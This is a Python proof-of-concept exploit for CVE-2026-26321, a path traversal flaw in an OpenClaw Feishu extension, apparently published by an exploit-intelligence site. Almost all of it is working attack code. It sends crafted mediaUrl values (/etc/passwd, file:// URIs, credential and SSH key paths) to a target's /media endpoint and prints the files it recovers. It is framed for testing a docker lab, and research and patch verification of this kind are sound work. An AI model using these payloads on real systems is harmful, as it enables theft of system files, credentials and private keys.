#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : OpenClaw < 2026.2.14 - Path Traversal / Local File Disclosure (Feishu Extension)
# CVE            : CVE-2026-26321
# Vendor         : OpenClaw
# Product        : OpenClaw
# Affected       : < 2026.2.14
# Type           : CWE-22 - Path Traversal
# CVSS           : 7.5 (High)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC for CVE-2026-26321: Path Traversal / Local File Disclosure in OpenClaw Feishu Extension

Demonstrates that sendMediaFeishu() reads arbitrary local files from disk when the
attacker-controlled `mediaUrl` parameter is set to a local filesystem path.

Root Cause: isLocalPath() in media.ts classifies filesystem paths and then
sendMediaFeishu() reads them via fs.readFileSync() with no sandboxing.

USAGE:
  python3 poc.py <host> <port>
  python3 poc.py localhost 8632
"""

import sys
import json
import urllib.request
import urllib.error


def api_post(base_url, endpoint, payload):
    """POST JSON to the harness and return the parsed response."""
    url = f"{base_url}{endpoint}"
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        url, data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return json.loads(resp.read().decode("utf-8")), resp.status
    except urllib.error.HTTPError as e:
        body = json.loads(e.read().decode("utf-8"))
        return body, e.code
    except Exception as e:
        return {"status": "error", "error": str(e)}, 0


def check_health(base_url):
    try:
        req = urllib.request.Request(f"{base_url}/health")
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status == 200
    except Exception:
        return False


def banner():
    print("""
======================================================================
  CVE-2026-26321 — Proof of Concept Exploit
  OpenClaw < 2026.2.14 — Path Traversal / Local File Read
  Feishu Extension: sendMediaFeishu() arbitrary file read
======================================================================
""")


def test_etc_passwd(base_url):
    """Read /etc/passwd via absolute path."""
    print("[*] Test 1: Read /etc/passwd via absolute path")
    resp, status = api_post(base_url, "/media", {"mediaUrl": "/etc/passwd"})

    if resp.get("status") == "ok" and resp.get("type") == "local_file_read":
        content = resp.get("content", "")
        if "root:" in content:
            lines = content.strip().split("\n")
            print(f"    [+] SUCCESS: Read /etc/passwd ({resp.get('bytes')} bytes)")
            print(f"        isLocalPath('/etc/passwd') = {resp.get('isLocalPath')}")
            for line in lines[:3]:
                print(f"        {line}")
            print(f"        ... ({len(lines)} total lines)")
            return True
    print(f"    [-] FAILED: {resp}")
    return False


def test_sentinel_file(base_url):
    """Read sentinel secret file."""
    print("[*] Test 2: Read sentinel file /tmp/cve-secret.txt")
    resp, status = api_post(base_url, "/media", {"mediaUrl": "/tmp/cve-secret.txt"})

    if resp.get("status") == "ok" and resp.get("type") == "local_file_read":
        content = resp.get("content", "").strip()
        if "CVE-2026-26321-SECRET" in content:
            print(f"    [+] SUCCESS: Exfiltrated secret data")
            print(f"        Content: \"{content}\"")
            return True
    print(f"    [-] FAILED: {resp}")
    return False


def test_file_protocol(base_url):
    """Read file via file:// protocol URI."""
    print("[*] Test 3: Read via file:// protocol")
    resp, status = api_post(base_url, "/media", {"mediaUrl": "file:///tmp/cve-secret.txt"})

    if resp.get("status") == "ok" and resp.get("type") == "local_file_read":
        content = resp.get("content", "").strip()
        if "CVE-2026-26321-SECRET" in content:
            print(f"    [+] SUCCESS: file:// protocol bypass works")
            print(f"        Content: \"{content}\"")
            return True
    print(f"    [-] FAILED: {resp}")
    return False


def test_credentials(base_url):
    """Exfiltrate simulated credentials."""
    print("[*] Test 4: Exfiltrate credentials (/tmp/fake-env)")
    resp, status = api_post(base_url, "/media", {"mediaUrl": "/tmp/fake-env"})

    if resp.get("status") == "ok" and resp.get("type") == "local_file_read":
        content = resp.get("content", "").strip()
        if "API_KEY" in content or "sk-" in content:
            print(f"    [+] SUCCESS: Credentials exfiltrated")
            print(f"        Content: \"{content}\"")
            return True
    print(f"    [-] FAILED: {resp}")
    return False


def test_ssh_key(base_url):
    """Exfiltrate simulated SSH key."""
    print("[*] Test 5: Exfiltrate SSH key (/tmp/fake-ssh-key)")
    resp, status = api_post(base_url, "/media", {"mediaUrl": "/tmp/fake-ssh-key"})

    if resp.get("status") == "ok" and resp.get("type") == "local_file_read":
        content = resp.get("content", "").strip()
        if "PRIVATE KEY" in content:
            print(f"    [+] SUCCESS: SSH key exfiltrated")
            print(f"        Content: \"{content[:60]}...\"")
            return True
    print(f"    [-] FAILED: {resp}")
    return False


def test_invalid_url_fallthrough(base_url):
    """Invalid URLs fall through to isLocalPath() = true."""
    print("[*] Test 6: Invalid URL fallthrough (isLocalPath catches all)")
    resp, status = api_post(base_url, "/media", {"mediaUrl": "not-a-valid-url"})

    if resp.get("isLocalPath") is True:
        print(f"    [+] SUCCESS: Invalid URL classified as local path")
        print(f"        This means ANY non-URL string triggers file read")
        return True
    print(f"    [-] FAILED: {resp}")
    return False


def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        print(f"Example: {sys.argv[0]} localhost 8632")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])
    base_url = f"http://{host}:{port}"

    banner()

    print(f"  Target: {base_url}")
    print()

    print("[*] Checking target is reachable...", end=" ")
    if not check_health(base_url):
        print("FAILED")
        print(f"\n[ERROR] Cannot reach {base_url}")
        print("Start the lab with: docker compose up -d")
        sys.exit(1)
    print("OK")
    print()

    results = {}

    print("-" * 60)
    results["Read /etc/passwd"] = test_etc_passwd(base_url)
    print()
    results["Read sentinel file"] = test_sentinel_file(base_url)
    print()
    results["file:// protocol"] = test_file_protocol(base_url)
    print()
    results["Credential exfil"] = test_credentials(base_url)
    print()
    results["SSH key exfil"] = test_ssh_key(base_url)
    print()
    results["Invalid URL fallthrough"] = test_invalid_url_fallthrough(base_url)
    print()

    # Summary
    print("=" * 60)
    print("  RESULTS SUMMARY")
    print("=" * 60)
    all_passed = True
    for name, passed in results.items():
        status = "PASS" if passed else "FAIL"
        icon = "+" if passed else "-"
        print(f"  [{icon}] {status}: {name}")
        if not passed:
            all_passed = False

    print()
    if all_passed:
        print("  [CONFIRMED] CVE-2026-26321 successfully exploited!")
        print("  sendMediaFeishu() reads arbitrary local files from disk")
        print("  and uploads them to the Feishu API for exfiltration.")
    else:
        passed_count = sum(1 for v in results.values() if v)
        total = len(results)
        print(f"  [{passed_count}/{total}] tests passed")

    print()
    return 0 if all_passed else 1


if __name__ == "__main__":
    sys.exit(main())
